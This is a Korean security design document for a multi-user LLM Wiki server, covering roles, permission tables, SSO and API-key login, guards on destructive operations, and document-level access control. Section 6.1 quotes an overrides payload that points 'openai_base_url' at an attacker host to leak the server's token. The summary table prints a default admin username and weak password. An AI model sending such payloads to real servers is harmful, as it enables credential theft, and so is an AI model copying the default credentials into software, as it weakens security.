# SECURITY — 다중 사용자 서버의 로그인·역할·권한 표·API 키·파괴적 작업 보호

> 대상: LLM Wiki 를 사내 서버에 올려 여러 사람과 여러 외부 LLM(MCP)이 쓰게 할 운영자/관리자. "누가 실수로 색인 DB 를 날리는 것"을 막고, 권한이 있는 사람이 **자기가 무엇을 하는지 알고** 실행하게 하는 것이 목표다.
> 사내 표준인 **아이디/비밀번호 로그인과 SSO 로그인의 병행**을 기본으로 설계했고, 다른 회사/환경으로 옮길 때 코드가 아니라 `security.json` 한 파일만 바꾸면 되게 했다.
> 2026-09-14: 역할 6단계(viewer·class3·class2·class1·builder·admin), 작업 등급 7단계, **admin 이 편집하는 권한 표(permissions)**, 익명(게스트) 접속, CLI 권한 게이트, API 키(MCP/스크립트) 추가. 설계 배경은 [IMPLEMENTATION_PLAN_0914.md](history/2026-09-14/IMPLEMENTATION_PLAN_0914.md) §1.

## 0. 요약 (한 장)

| 질문 | 답 |
|---|---|
| 로그인 방식 | **로컬 ID/비밀번호**(security.json 의 users, PBKDF2 해시) **+ SSO**(OIDC 코드 플로우 또는 사내 리버스 프록시 헤더) **+ API 키**(`Authorization: Bearer lwk_…`, MCP/스크립트용). 한 로그인 화면에 ID/PW 폼과 SSO 버튼이 같이 뜬다 |
| 역할 | 6단계 `viewer < class3 < class2 < class1 < builder < admin` (누적). 구 역할 `operator` 는 `class1` 로 자동 해석 |
| 작업 등급 | 7단계 `read < run < edit < index < rebuild < admin < destructive` (§2 표). 서버가 모든 요청을 이 표로 분류한다 |
| 권한 표 | 등급별 최소 역할(`permissions.levels`) + 개별 작업 오버라이드(`permissions.ops`) 를 **admin 이 Web 보안 탭 / `security perms set`** 으로 바꾼다. 코드 변경 없음 |
| 기본 접속자 | `anonymous_role: "viewer"` — 로그인 없이 접속한 사람은 게스트(viewer)로 **DB 에 영향 없는 기능(질의·검색·조회·피드백·제안·기대 결과 포렌식)** 을 쓴다. `""` 로 두면 로그인 필수 |
| "확인만" | `edit`/`index`/`admin` 등급 = 역할 검사 + 확인 대화상자 |
| "문구 + 비밀번호" | `rebuild`(전체/채널 리빌드·스냅샷 복원) 와 `destructive`(로그 삭제·config reset·사용자 삭제) = 역할 + 확인 + 확인 문구(`DELETE INDEX`) + 로컬 계정이면 비밀번호 재입력. SSO/API 키 계정은 문구만 |
| 실수 보험 | 파괴적 작업 직전에 **자동 스냅샷**(`data/snapshots/`, 최근 3개 보존) → `snapshot restore` 로 되돌림 |
| 감사 | 누가·언제·무엇을·허용/거부 → `logs/audit.jsonl` (Web › Settings › 보안 탭, `security audit`). CLI 게이트 거부도 기록 |
| CLI | 같은 표로 게이트한다. 실행자 역할 = `--user`/`LLMWIKI_USER`+`LLMWIKI_PASSWORD` 로컬 계정 > `LLMWIKI_API_KEY` > `security.json cli.default_role`(기본 admin). 거부는 종료 코드 5 |
| 기본 admin | `kh82.kim / 1234qwer` (프로젝트 루트 security.json 에 생성됨). 변경: `users passwd kh82.kim` 또는 Web 보안 탭 |
| 문서 접근 제어 | 역할이 **무엇을 읽을 수 있나**는 `docacl.json`(경로 규칙) + 문서 front matter 의 `acl:` 로 정한다. 질의 근거·채널 검색·문서 열람·MCP 네 출구를 모두 막는다 (§6.2). 규칙이 없으면 아무도 막지 않는다 |
| 프롬프트 인젝션 | 컨텍스트에 들어가는 문서 본문은 구획 흉내 조각을 무력화해 펜스로 감싼다(`llmwiki/ctxguard.py`, 토글 `context_guard`). 내용은 지우지 않고 표시만 바꾼다 |
| 이식 | `security.json` 하나(+ `.env` 의 OIDC client secret, 문서 등급을 쓰면 `docacl.json`). 표준 라이브러리만 사용 |

## 1. 왜 "암호 하나"가 아니라 계정·역할·권한 표인가 (검토한 대안)

| 방식 | 장점 | 단점 | 결론 |
|---|---|---|---|
| A. 공유 관리 암호 하나 | 구현이 가장 단순 | 누가 했는지 모른다 · 유출 시 전원 교체 · 퇴사자 회수 불가 | **재인증 수단**으로만 채택(로컬 계정의 비밀번호 재입력) |
| B. 사용자 계정 + 역할 (RBAC) | 감사 가능 · 퇴사/이동 시 계정만 정리 · viewer 는 위험 버튼을 못 누름 | 계정 관리 부담 | **채택**. 회사 표준(ID/PW + SSO)과 같은 모양 |
| C. 확인 문구만 (GitHub 식) | "알고 한다" 보장 | 누구나 할 수 있음 | **B 위에 얹음**. rebuild/destructive 는 역할이 있어도 문구 |
| D. 기능마다 역할을 낱개로 지정 | 세밀함 | 엔드포인트 60개+ 를 일일이 편집 → 실수, 새 기능마다 누락 | **등급표 + 오버라이드**로 대체(§2). 등급 7개에 최소 역할을 두고 예외만 op 단위로 |

최종안 = **B + C + (로컬 계정이면 A) + 등급표/오버라이드 + 자동 스냅샷 + 감사 로그**.

## 2. 역할과 작업 등급표 (= `llmwiki/auth.py: classify_api / classify_cli`)

### 2.1 역할 (누적: 위 역할은 아래 역할의 작업을 모두 할 수 있다)

| 역할 | 뜻 | 대표 작업 |
|---|---|---|
| `viewer` | 조회·질의 (DB 무영향; 로그만 남음) | query, search, 문서/그래프/위키 조회, 👍👎 피드백, 제안 등록, **forensic expect**, pin test, 규칙/시간 테스트, MCP 도구 전부 |
| `class3` | + 토큰·시간을 쓰는 실행 | eval, trial run, fusion compare, models test(--live), evolve review, Web 콘솔(읽기 명령), MCP 소스 test/enrich |
| `class2` | + 지식 데이터 편집 (되돌릴 수 있음, 색인 불변) | pin/규칙(query_rules)/프롬프트/튜닝/프리셋 저장, 위키 편집, 제안 apply/reject, memory decay/consolidate, trial 삭제 |
| `class1` | + 색인 갱신 (증분·복구 가능) | 증분 build, `build --channels …`, verify --fix, precompute, maintenance(vacuum·fts_optimize·wal_checkpoint·clear_cache·warm_cache·refresh_doc_refs), 스냅샷 생성/prune, 워처 시작/중지, MCP ingest, embed clear-cache |
| `builder` | + 색인 전체/채널 리빌드, 복원 | `build --full/--reset`, `build fts|vector|graph`, snapshot restore |
| `admin` | + 설정·프로바이더·사용자·권한 | config/models/agents/mcp_sources 저장, users, security(perms/anonymous/cli), apikey, 워처 설정 저장, `build --purge-logs`, `maintenance purge_requests`, `config reset`, `users remove` |

구 이름 호환: `operator` → `class1` (security.json 의 users/role_map/ops 에 남아 있어도 그대로 읽힌다).

### 2.2 작업 등급과 기본 최소 역할

| 등급 | 뜻 | 기본 최소 역할 | 확인 방식 (mode=on) | 대표 작업 |
|---|---|---|---|---|
| `read` | 조회·질의 | viewer | 없음 | GET 전부(admin 전용 조회 제외), `/api/query`·`/api/search`·`/api/feedback`·`/api/evolve/propose`·`/api/forensic/expect`·`/mcp`, `build verify`(fix 없음), pins test, presets 임시 적용, query_rules test |
| `run` | 토큰·시간 소모 실행 | class3 | 없음 | `/api/eval`, `/api/trials`(run), `/api/fusion/compare`, `/api/models/test`, `/api/evolve/review`, `/api/cli`(읽기 명령; 콘솔 자체가 run 이상), mcp_sources test/enrich |
| `edit` | 지식 편집 | class2 | 확인 대화상자 | `/api/pins` `/api/query_rules` `/api/prompts` `/api/tuning` `/api/presets`(save) `/api/wiki/page` `/api/rules` `/api/evolve/apply|reject` `/api/memory` trials delete |
| `index` | 색인 갱신 | class1 | 확인 대화상자 | `/api/build`(증분, `channels` 포함), `/api/build/verify`(fix), `/api/precompute`, `/api/maintenance`(purge 제외), `/api/snapshot`(create/prune), `/api/watch`(start/stop/tick), mcp_sources ingest |
| `rebuild` | 리빌드·복원 | builder | 확인 + 문구 + (로컬) 비밀번호 + 자동 스냅샷 | `/api/build`(full/reset), `/api/build {channel}`, `/api/snapshot`(restore), CLI `build --full`, `build fts|vector|graph`, `snapshot restore` |
| `admin` | 설정·사용자·권한 | admin | 확인 대화상자 | `/api/config` `/api/models/set` `/api/agents` `/api/mcp_sources`(save) `/api/auth/users` `/api/security` `/api/apikeys` `/api/watch`(save) |
| `destructive` | 로그·이력·설정 삭제 | admin | 확인 + 문구 + 비밀번호 + 스냅샷 | `/api/build {purge_logs}`, `/api/maintenance purge_requests`, CLI `config reset`, `users remove` |

- 모르는 새 POST 엔드포인트는 자동으로 `edit` 으로 취급된다(안전한 기본값). 새 기능을 붙일 때 표(`classify_api`/`classify_cli`)에 한 줄 추가하면 권한이 따라온다 — ad-hoc `confirm()` 을 흩뿌리지 않는다.
- **admin 전용 조회**(GET 인데 read 가 아닌 것): `/api/auth/users` · `/api/audit` · `/api/security` · `/api/apikeys` · `/api/admin/server` · `/api/env` · `/api/docacl` · `/api/query_users`.
  등급이 `read` 인 경로라도 **응답 안에 admin 전용 값이 섞여 있으면 그 부분만 덜어 낸다.** 지금 그런 곳은 하나다 — `GET /api/opstats` 의 `users` 절(누가 몇 건 질의했나)은 `/api/query_users` 와 같은 기준으로 admin 에게만 나가고, 아닌 사람에게는 `redacted` 에 이유가 담겨 온다(가린 사실 자체는 숨기지 않는다). MCP `wiki_status(full=true)` 도 호출한 API 키의 역할로 같은 판정을 받는다 — [OPS_STATS.md §4.5](OPS_STATS.md).
  **경로 등급만 보고 끝내면 안 된다**: 같은 값을 주는 다른 경로가 더 엄격하다면 그쪽이 기준이다. 아니면 막아 둔 문을 옆문으로 여는 셈이 된다(2026-09-20 정렬 감사에서 실제로 그랬다).
- Web 콘솔(`/api/cli`)은 **입력한 argv 를 같은 표로 분류**한다. `build fts` 를 콘솔에 쳐도 화면 버튼과 똑같이 문구·비밀번호를 요구하고, 승인되면 `--yes` 를 붙여 실행된다.
- MCP 도구는 모두 `read` (색인을 바꾸지 않음). `wiki_propose`/`wiki_feedback`/`wiki_forensic` 은 제안·피드백·진단 기록만 남긴다.

### 2.3 권한 표 편집 (`security.json → permissions`)

```jsonc
"anonymous_role": "viewer",     // 미로그인 접속자 역할 ("" = 로그인 필수)
"permissions": {
  "levels": {"read": "viewer", "run": "class3", "edit": "class2", "index": "class1", "rebuild": "builder", "admin": "admin", "destructive": "admin"},
  "ops": {                       // 개별 작업 오버라이드: op 이름 = 감사 로그의 op (Web 보안 탭 '대표 op 목록' 참고). 접미 * 는 접두 일치
    "/api/eval": "viewer",       // 예: eval 은 viewer 도
    "cli:trial run": "class2",   // 예: CLI trial run 은 class2 부터
    "cli:build*": "admin"        // 예: 모든 CLI build 계열은 admin 만
  }
},
"cli": {"default_role": "admin", "require_login": false}   // CLI 실행자 기본 역할 / 로그인 강제
```
판정 순서: `ops`(정확 일치 → `*` 접두 일치) → `levels[등급]` → 코드 기본값. 확인 방식(대화상자/문구/비밀번호)은 등급에 고정이며 역할을 낮춰도 바뀌지 않는다.

```bat
python -m llmwiki security perms                       :: 현재 표 + 역할 설명
python -m llmwiki security perms set run=viewer        :: 등급의 최소 역할 변경
python -m llmwiki security perms set "/api/eval=class2" "cli:trial run=class2"   :: 개별 작업 오버라이드
python -m llmwiki security perms set "/api/eval="      :: 오버라이드 제거 (빈 값)
python -m llmwiki security perms reset                 :: 기본값
```
Web: Settings › **보안 · 사용자** › "권한 표" — 등급별 최소 역할 드롭다운, 익명(게스트) 역할, CLI 기본 역할/로그인 필수, 개별 오버라이드 편집란(`op = 역할` 한 줄에 하나), 대표 op 목록. 저장 즉시 반영(재시작 불필요).

## 3. 흐름

```
브라우저/외부 LLM ──POST /api/build {channel:"fts"}──▶ 서버 identify()
     ├─ 프록시 헤더 SSO → Bearer API 키 → 세션 쿠키 → (anonymous_role) 게스트
     └─ authorize(): classify_api → (level, op) → min_role(level, op) 와 역할 비교
          ├─ 게스트가 부족 → 401 + need{role} (화면은 '로그인 필요' 안내)
          ├─ 로그인 사용자가 부족 → 403 (감사 로그: DENY)
          ├─ 확인 필요 → 428 + need{confirm | phrase:"DELETE INDEX", password:true, snapshot:true}
          │      core.js api() 가 모달을 띄워 문구/비밀번호를 받고 같은 요청을 다시 보냄
          └─ 통과 → 실행 → 감사 로그(ok)
```
- 세션: HMAC-SHA256 서명 쿠키(`llmwiki_session`, HttpOnly, SameSite=Lax, HTTPS 면 Secure). 서명 키는 `data/.session_secret`(자동 생성, 지우면 전원 로그아웃). 만료 `session_hours`(기본 12h). 로컬 사용자의 역할을 바꾸면 기존 세션에도 즉시 반영된다.
- CSRF: 모든 API 호출에 `X-Requested-With: llmwiki` 헤더 + `Origin` 검사. curl/스크립트는 JSON 본문이면 통과.
- 무차별 대입: 로그인 실패 시 0.5s 지연 + 감사 로그. (IP 차단은 리버스 프록시에 맡긴다 — §7)

## 4. 로그인 방식 — `security.json`

파일: 프로젝트 루트 `security.json` (`LLMWIKI_SECURITY_PATH` 로 위치 변경). 없으면 기본값(mode auto, 익명 viewer, 사용자 없음). `python -m llmwiki security init` 으로 생성.

```jsonc
{
  "mode": "auto",                 // off | on | auto (auto: 127.0.0.1 에 바인드하면 off, 그 외(0.0.0.0 등)는 on)
  "session_hours": 12,
  "anonymous_role": "viewer",
  "local":  {"enabled": true, "min_password_len": 8},
  "sso":    { … §4.2 / §4.3 … },
  "users":  {
    "kh82.kim": {"role": "admin", "pw": "pbkdf2_sha256$200000$…", "name": "kh82.kim"},
    "erin":     {"role": "class2"}                 // pw 없음 = SSO 전용, 역할만 고정
  },
  "api_keys": {"3f9a1c2e": {"name": "claude-desktop-kim", "role": "viewer", "hash": "sha256…", "created": …}},
  "permissions": { … §2.3 … },
  "cli": {"default_role": "admin", "require_login": false},
  "destructive": {"confirm_phrase": "DELETE INDEX", "require_reauth": true, "snapshot_before": true, "snapshot_keep": 3},
  "warn": {"confirm": true}
}
```

### 4.1 로컬 ID/비밀번호 (항상 가능)
```bat
python -m llmwiki users add kh82.kim --role admin        :: 비밀번호 프롬프트 (또는 --password, 환경변수 LLMWIKI_PASSWORD)
python -m llmwiki users add bob --role class1
python -m llmwiki users list | set-role bob builder | passwd bob | remove bob
```
Web › Settings › **보안 · 사용자** 탭에서도 admin 이 추가/역할 변경/비밀번호 재설정을 할 수 있고, 각 사용자는 자기 비밀번호를 바꿀 수 있다. 해시는 PBKDF2-HMAC-SHA256 200,000회 + 16바이트 salt (표준 라이브러리).

### 4.2 SSO — OIDC (Azure AD/Entra · Okta · Keycloak · Google Workspace · 사내 IdP)
IdP 에 "웹 앱(confidential client)" 을 등록하고 redirect URI 를 `https://<wiki-host>/auth/sso/callback` 으로 넣는다.
```jsonc
"sso": {
  "enabled": true, "type": "oidc", "button_label": "사내 SSO 로 로그인",
  "issuer": "https://login.corp.example/realms/modem",      // + /.well-known/openid-configuration 로 자동 검색
  "client_id": "llm-wiki",
  "client_secret_env": "LLMWIKI_OIDC_CLIENT_SECRET",         // 비밀은 .env 에: LLMWIKI_OIDC_CLIENT_SECRET=…
  "redirect_uri": "https://wiki.corp.example/auth/sso/callback",
  "scopes": "openid profile email",
  "username_claim": "preferred_username",                     // 없으면 email → sub
  "groups_claim": "groups",                                   // IdP 가 그룹을 넣어 주는 claim 이름
  "role_map": {"admin": ["wiki-admins"], "builder": ["wiki-builders"], "class1": ["wiki-ops", "modem-sw"], "class2": [], "class3": []},
  "default_role": "viewer",
  "allowed_domains": ["corp.example"],                        // (선택) email 도메인 제한
  "ca_bundle": ""                                             // (선택) 사내 CA PEM 경로
}
```
동작: `/auth/sso/start` → IdP 로그인 → `/auth/sso/callback?code&state` → 서버가 토큰 엔드포인트에 code 교환(client_secret) → id_token 의 `iss/aud/exp/nonce` 검증 + userinfo 병합 → `username_claim` 으로 사용자 id, `groups_claim` → `role_map`(높은 역할부터 매칭) 으로 역할 → 세션 쿠키. `users` 에 같은 id 가 있으면 그 역할이 우선한다. id_token 서명 검증은 `pip install pyjwt[crypto]` 가 있으면 수행한다.

### 4.3 SSO — 리버스 프록시 헤더 (가장 이식하기 쉬운 방식)
```jsonc
"sso": {"enabled": true, "type": "header",
        "header": {"user": "X-Forwarded-User", "groups": "X-Forwarded-Groups", "trusted_proxies": ["10.1.2.3"]},
        "role_map": {"admin": ["wiki-admins"], "class1": ["wiki-ops"]}, "default_role": "viewer"}
```
`trusted_proxies` 에 적힌 주소에서 온 요청의 헤더만 믿는다. 이 방식에서는 로그인 화면 없이 바로 접속된다(로컬 계정은 여전히 `/login`).

### 4.4 API 키 (MCP HTTP · 스크립트 · CI)
```bat
python -m llmwiki apikey add claude-desktop-kim --role viewer     :: 토큰 lwk_<id>_<secret> 은 이때 한 번만 표시
python -m llmwiki apikey list | remove <id|name>
```
사용: `Authorization: Bearer lwk_…` 헤더 (MCP 클라이언트 설정의 `headers`, curl, `LLMWIKI_API_KEY` 환경변수로 CLI 게이트에도). 파일에는 secret 의 SHA-256 해시만 저장되고, 키마다 역할이 있어 필요한 만큼만 준다(외부 LLM 은 viewer 로 충분). Web 보안 탭 "API 키" 에서도 발급/삭제. 상세는 [MCP.md](MCP.md).
**잘못되거나 폐기된 `lwk_` 키는 게스트로 강등되지 않고 401** 을 돌려준다(2026-09-15 수정) — 폐기한 키가 `anonymous_role=viewer` 덕에 계속 동작하거나, 클라이언트가 키 오타를 모른 채 쓰는 일을 막기 위해서다. `lwk_` 형식이 아닌 Bearer(프록시가 붙인 토큰 등)는 무시하고 다음 단계(쿠키 → 익명)로 넘어간다. 거부는 `audit.jsonl` 에 남는다.

### 4.5 병행
로그인 화면(`/login`)은 `local` 이 켜져 있고 사용자가 있으면 ID/비밀번호 폼을, `sso.enabled` 면 "SSO 로 로그인" 버튼을, `anonymous_role` 이 있으면 "게스트로 계속" 링크를 함께 보여 준다. 네 가지(로컬·SSO·API 키·게스트)가 같은 세션/역할 체계를 쓴다.

## 4.1 권한 미리보기 (admin 이 다른 권한 화면을 확인)

헤더의 `👁 권한 보기` 로 자기 역할을 **낮춰서** 화면과 동작을 확인한다(`POST /api/auth/preview {role}`).
쿠키 `llmwiki_preview` 하나로 동작하며, `auth.apply_preview()` 가 `web/server.py: _user()` 한 곳에서 적용되므로
화면뿐 아니라 **모든 권한 검사에 그대로 반영된다** — viewer 로 보는 중에는 빌드 요청이 403 이다.

- **올릴 수는 없다.** 요청한 역할이 실제 역할보다 높으면 무시한다. 실제 viewer 가 `preview=admin` 을 보내거나
  쿠키를 직접 위조해도 viewer 그대로다(실측 확인). 그래서 이 쿠키에는 서명을 두지 않았다 — 위조해 봐야 자기 권한을 줄일 뿐이다.
- 미리보기 중에는 화면 맨 위에 노란 띠가 계속 뜨고, 전환·해제는 감사 로그에 남는다.
- 회귀 테스트: `tests/test_concurrency_0915.py` 의 `RolePreviewTest` (낮추기만 · 위조 무시 · 쿠키 왕복).
- 실제 로그인 흐름까지 보려면 `serve --host 0.0.0.0` 으로 인증을 켠다 — [WEB_UI.md](WEB_UI.md) §8.

## 5. CLI 권한 게이트

CLI 는 서버 OS 계정으로 실행되므로 종전에는 admin 으로 봤다. 공용 서버에서 여러 사람이 셸을 쓰면:
```jsonc
"cli": {"default_role": "viewer", "require_login": false}     // 기본 viewer: query/search/조회만. 상위 작업은 --user 로 승격
```
```bat
python -m llmwiki build                             :: !! 권한 부족: 'cli:build'(색인 갱신)은 class1 이상 … (종료 코드 5, audit DENY)
python -m llmwiki --user bob build                  :: 비밀번호 프롬프트 → class1 로 실행
set LLMWIKI_USER=bob& set LLMWIKI_PASSWORD=…        :: 스케줄러/스크립트 (비대화형)
set LLMWIKI_API_KEY=lwk_…                           :: 또는 API 키의 역할로
```
`require_login: true` 면 `--user`/`LLMWIKI_USER`/`LLMWIKI_API_KEY` 없이는 read 등급도 거부한다. Web 콘솔(`/api/cli`)은 서버가 이미 판정했으므로 CLI 게이트를 다시 타지 않는다. 통과한 비-read 작업도 감사 로그에 `via=cli` 로 남는다.

## 6. 파괴적 작업 정책 상세

| 항목 | 값 | 설명 |
|---|---|---|
| `confirm_phrase` | `DELETE INDEX` | rebuild/destructive 에서 그대로 타이핑해야 하는 문구. 조직에 맞게 바꿔도 됨 |
| `require_reauth` | true | 로컬 계정은 비밀번호 재입력. SSO/API 키 계정은 문구만 |
| `snapshot_before` | true | reset/복원 직전에 `data/snapshots/<시각>_auto:reset/` 에 db/wiki/rules/config 복사 |
| `snapshot_keep` | 3 | 자동 스냅샷 보존 개수(수동 스냅샷은 지우지 않음) |

스냅샷: `snapshot list | create --tag t | restore <name> | prune --keep N` (CLI), Web › 보안 탭. 복원 직전에도 자동 스냅샷을 남기므로 복원 자체도 되돌릴 수 있다. 채널 리빌드(`build fts|vector|graph`)는 chunks 를 지우지 않으므로 스냅샷 없이 문구 확인만 한다.

## 6.1 요청 단위 `overrides` 화이트리스트와 500 응답 마스킹 (2026-09-18 — 외부 바인드 기본의 전제)

`web_host` 기본값이 `0.0.0.0` 으로 바뀌면서([BRINGUP_GUIDE.md §3.1](BRINGUP_GUIDE.md)) 다음 두 구멍을 먼저 막았다
([CODE_REVIEW_0917.md](history/2026-09-17/CODE_REVIEW_0917.md) §0 P0-1 · §2.3 S2, 설계 [IMPLEMENTATION_PLAN_0918.md §2.14](history/2026-09-18/IMPLEMENTATION_PLAN_0918.md)).

**(a) 요청 단위 overrides.** `/api/query`·`/api/eval`·`/api/sweep` 등의 본문 `overrides` 는 예전에 Settings 의 **모든** 필드를 받아들였다.
읽기 등급(익명 포함)이 `{"overrides": {"openai_base_url": "http://attacker/v1"}}` 를 보내면 서버가 `.env` 의 PAT 를 그 주소로 보냈고,
`corpus_dirs` 로 임의 폴더를 색인시킬 수도 있었다. 지금은 `llmwiki/web/server.py: _filter_overrides` 가 다음만 통과시킨다.

| 누구 | 허용되는 키 |
|---|---|
| 모든 역할 | 토글 전부 · `top_k_*` · `rrf_k` · `graph_hops` · `rerank_candidates` · `rerank_chunk_chars` · `context_*` · `answer_max_tokens` · `debug_level` · `llm_provider` · `llm_model` · `llm_effort` · `answer_effort` · `llm_fallbacks` · `embed_provider/model` · `llm_timeout`/`llm_retries`/`llm_retry_backoff*`/`llm_budget_s` · `answer_mode` · `output_mode` · `query_cache_size` · `llm_graph_budget/min_chars` · `tuning{…}`(요청 단위 튜닝 오버레이) · `<role>_<attr>` 단축 키와 `llm_roles.<role>.{provider, model, effort, timeout_s, retries, backoff*, budget_s, max_tokens, circuit_*, ensemble, *_penalty}` |
| admin | 위 + 나머지 전부 (`deny` 목록 제외) |
| 아무도 | `security.json overrides.deny` 에 적은 키 |

URL·헤더·경로·서버 운영 키(`*_base_url`, `openai_extra_headers`, `openai_api_key_header`, `corpus_dirs`, `data_dir`, `wiki_dir`, `*_dir`, `mcp_plugins_dir`, `web_*`, `mcp_*` …)는
admin 이 **Settings › config.json 에 저장**하는 길만 있다. 금지 키가 섞이면 조용히 버리지 않고 **403 과 키 이름**을 돌려준다("설정이 안 먹는다" 로 보이지 않게).

```jsonc
// security.json (기본값 그대로 — 조정은 코드 수정 없이 이 파일에서)
"overrides": {"allow_extra": [], "deny": []}
```

- `allow_extra`: 누구나 쓰게 추가할 키 (예 `["openai_extra_headers"]` — 권장하지 않음).
- `deny`: admin 도 요청 단위로는 못 바꾸게 할 키 (예 `["corpus_dirs"]`).
- 확인: viewer 로 `POST /api/query {"question":"x","overrides":{"openai_base_url":"http://x"}}` → 403. `tools/verify/verify_web.py` 와 `tests/test_overrides_guard.py` 가 검사한다.

**(b) 500 응답.** 예전에는 서버 결함의 스택트레이스(파일 경로·코드 조각)를 모든 사용자에게 돌려주면서 서버 로그에는 남기지 않았다.
지금은 `_server_error` 가 트레이스를 `logs/error.log` 에 `ref` 와 함께 남기고 클라이언트에는 `{"error", "code": "internal", "ref": "<8자>", "hint": "logs grep --text <ref>"}` 만 준다.
트레이스를 응답에 포함하는 경우는 둘 — 요청자가 admin 이거나 `server.json debug.expose_trace = true`(기본 false, 개발 PC 용).

```jsonc
// server.json (기본값)
"debug": {"expose_trace": false}
```

운영자는 사용자가 알려 준 `ref` 로 `python -m llmwiki logs grep --text <ref> --file error` 를 실행해 원인을 본다.

## 6.2 문서 단위 접근 제어 — 누가 **어떤 문서를 근거로** 볼 수 있나 (2026-09-19)

> 파일 `docacl.json` (원본 [`setup/docacl.example.json`](../setup/docacl.example.json)) · 토글 `doc_acl` · 구현 `llmwiki/docacl.py` · 테스트 `tests/test_doc_acl.py` (24항목)

### 왜 필요한가

§2 의 역할은 지금까지 **무엇을 실행할 수 있는가**만 정했다. 질의를 낼 수 있는지, 빌드를 돌릴 수 있는지.
그런데 **무엇을 읽을 수 있는가**는 아무도 정하지 않았다. 2026-09-19 이전에는 검색 경로에 신분이 전달조차
되지 않아서(`_do_query()` 가 사용자 정보를 티켓·로그에만 썼다), 색인된 문서가 하나라도 있으면
익명 viewer 도 그 내용을 근거로 받아 볼 수 있었다.

사내 위키에는 등급이 다른 문서가 섞인다 — 인사·보안 사고·미공개 로드맵·고객사 이름.
**RAG 에서 검색은 곧 읽기다.** 색인에 들어간 순간 누구의 질문에도 인용될 수 있으므로,
읽기 권한을 문서 단위로 나눌 수 있어야 한다.

### 어떻게 정하나 — 두 곳, 높은 쪽이 이긴다

| 출처 | 적는 곳 | 예 | 성격 |
|---|---|---|---|
| 문서 자신 | 마크다운 front matter | `acl: class1` · `acl: [class1, admin]` | 정확하지만 빠뜨리기 쉽다 |
| 경로 규칙 | `docacl.json` 의 `rules[]` | `{"prefix": "corpus/hr/", "min_role": "class1"}` | 폴더째 · 새 문서에도 바로 걸린다 |

둘 다 걸리면 **더 높은 등급**을 요구한다(안전한 쪽). 목록(`[class1, admin]`)을 쓰면 그중 **가장 낮은 역할**이 하한이다.
아무것도 안 걸리면 `default_min_role`(기본 `viewer` = 모두 공개). `default_min_role` 을 올리면
"규칙에 적힌 것만 공개"인 화이트리스트 방식이 된다. **admin 은 운영·감사를 위해 항상 전부 본다.**

역할 순서는 §2.1 과 같다: `viewer < class3 < class2 < class1 < builder < admin`.
front matter 의 역할 이름에 오타가 있으면 값이 무시되어 문서가 공개로 남으므로, 빌드 린트가 `acl` 필드 오류로 알려 준다.

### 어디서 막나 — 한 군데가 아니라 모든 출구

하나만 막으면 나머지로 샌다. 네 창구가 **같은 판정기**(`docacl.Filter`)를 쓴다.

| 출구 | 막는 자리 | 관측 |
|---|---|---|
| 질의 답변의 근거 | `query_engine` 의 **`doc_acl` 단계**(부스트 직후·리랭크 직전) | trace 의 `doc_acl` 노드 (`blocked_docs`, `needs`, `removed`) |
| 채널 검색 디버그 | `retrieval.channel_search` (채널별 원본 목록에서 먼저 제거 — snippet 으로 본문이 새지 않게) | 응답의 `acl` · `counts.acl_blocked` |
| 문서 열람 | `/api/doc`·`/api/doc_chunks`·`/api/chunk`, MCP `wiki_doc` | 403 + `min_role` |
| 목록 누설 | `querydebug.doc_detail` 의 후보 목록(`alternatives`), MCP `wiki_related` | 조용히 제외 |

`doc_acl` 단계를 **리랭크 앞**에 둔 이유: 융합·부스트 통계는 원래 후보 기준으로 남겨 "무엇이 걸러졌나"를
볼 수 있게 하고, 리랭크·컨텍스트·답변·인용 등 뒤쪽 출구가 전부 이 아래에 오도록 하기 위해서다.

신분은 `Pipeline.request_scope(actor={"user","role","origin"})` 로 전달된다. Web·MCP 가 모두 이걸로 감싸고,
CLI·스케줄러·내부 호출은 `actor` 를 주지 않아 `admin` 으로 동작한다(로컬 운영자 도구).

### 무엇을 하지 않나

- **암호화하지 않는다.** DB 파일을 직접 여는 사람은 다 본다. 이것은 애플리케이션 계층의 접근 제어다.
- **기본값은 아무도 막지 않음**이다. 규칙을 적지 않으면 예전과 똑같이 동작한다.
- **그래프 엔티티 이름은 가리지 않는다.** 엔티티·관계는 문서 본문이 아니라 추출된 이름이라 별도 축이다
  (완전히 가리려면 해당 문서를 색인에서 빼는 편이 맞다).
- **admin 을 막을 수는 없다.**

### 실패하면 어느 쪽으로 기우나

접근 제어에서 "예외 하나에 열려 버리는" 길은 두지 않았다. 판정 중 오류가 나면 `chunk_id` 만으로
보수적으로 다시 거르고(`doc_acl` 단계), 문서 열람은 **막는다**. 단, 규칙이 하나도 없으면 애초에 판정기가
꺼지므로(`enabled=False`) 오류 경로 자체가 없다.

### 다루는 법 (세 창구)

```bash
python -m llmwiki security docacl init                     # docacl.json 생성
python -m llmwiki security docacl show                     # 규칙·기본 등급·토글 상태
python -m llmwiki security docacl check --role viewer      # 지금 색인에 대 보고 몇 건이 가려지는지 (저장 전 영향 확인)
python -m llmwiki security docacl check --role class2 --json
```

- **Web**: Settings › 보안 › **문서 접근 제어**. 규칙 추가/삭제·기본 등급·사용 여부를 편집하고,
  **영향 확인** 버튼이 역할별 "보임/가려짐" 건수와 가려지는 문서 예를 보여 준다.
- **API**: `GET /api/docacl`(admin) · `POST /api/docacl {action:"check"|"save"}`(admin).
- **MCP**: 규칙 **편집**은 노출하지 않는다(admin 전용 설정). 그러나 MCP 도구(`wiki_query`·`wiki_search`·`wiki_doc`·`wiki_related`)는
  API 키의 역할로 **적용을 받는다** — 키 하나로 전 문서가 열리지 않는다.

### 긴급 해제

`config.json` 토글 `doc_acl: false` (Settings › 토글 › ⑧ 보안) 하나로 규칙 전체가 무시된다.
`docacl.json` 의 `enabled: false` 도 같은 효과다.

## 6.3 창구마다 다른 문이 되지 않게 (2026-09-19 2차 점검)

§6.1 의 overrides 화이트리스트와 §6.2 의 문서 접근 제어는 처음에 **Web 창구에만** 걸려 있었다.
같은 일을 하는 다른 길이 남아 있으면 자물쇠는 장식이 된다. 2차 점검에서 그 길들을 전부 같은 함수로 모았다.

| 보호 | 어디에 살아야 하나 | 지금 |
|---|---|---|
| overrides 화이트리스트 | 창구가 아니라 **auth 계층** | `auth.filter_overrides(ov, role, cfg)` — Web(`_filter_overrides`)과 MCP(`mcp.safe_overrides`)가 같은 함수를 부른다. MCP 는 호출자 역할(`pipe.actor`)로 거르고, stdio(로컬 운영자)는 admin 이라 예전과 같다 |
| 문서 접근 제어 신분 | 질의를 **실행하는 모든 길** | `/api/query` · `/api/debug/query` · `/api/search` · `/api/query/rerun` · 잡(eval·sweep·precompute) · `/api/cli` 콘솔 · `/mcp` — 일곱 자리 |
